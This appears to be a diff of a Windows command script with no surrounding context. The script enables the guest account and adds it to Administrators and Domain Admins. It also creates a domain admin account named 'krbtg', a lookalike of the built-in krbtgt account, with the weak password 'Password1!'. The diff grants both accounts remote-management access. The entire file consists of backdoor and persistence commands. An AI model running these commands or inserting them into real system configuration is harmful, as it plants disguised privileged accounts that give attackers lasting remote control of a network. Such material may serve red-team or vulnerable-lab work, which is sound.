@@ -1,8 +1,10 @@
 net user guest /active:yes
 net localgroup "Administrators" guest /add /y
+NET LOCALGROUP "Remote Management Users" guest /ADD
 
 net user /add krbtg Password1! /domain
 net group "Domain Admins" krbtg /ADD /DOMAIN
+NET LOCALGROUP "Remote Management Users" krbtg /ADD
 
 net group "Domain Admins" guest /ADD
 
